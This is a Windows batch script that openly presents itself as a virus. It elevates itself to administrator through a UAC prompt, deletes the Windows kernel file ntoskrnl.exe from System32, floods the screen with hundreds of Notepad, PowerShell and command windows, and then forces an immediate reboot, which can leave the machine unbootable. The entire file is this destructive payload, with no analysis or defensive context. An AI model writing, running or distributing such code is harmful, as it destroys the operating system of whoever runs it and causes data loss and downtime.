@echo off
cd /d %USERPROFILE%
cd ..
cd ..
cd Windows
cd System32

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo Jsem v admin rezimu
pause

del ntoskrnl.exe


set count=100

:loop
start notepad
set /a count=%count%-1
if %count% GTR 0 goto loop


set count=100

:loop1
start powershell
set /a count=%count%-1
if %count% GTR 0 goto loop1


set count=100

:loop2
start cmd /k echo Virus!!!
set /a count=%count%-1
if %count% GTR 0 goto loop2


set count=100

:loop3
start powershell -NoExit -Command "Write-Host Test"
timeout /t 1 >nul
set /a count=%count%-1
if %count% GTR 0 goto loop3

shutdown /r /t 0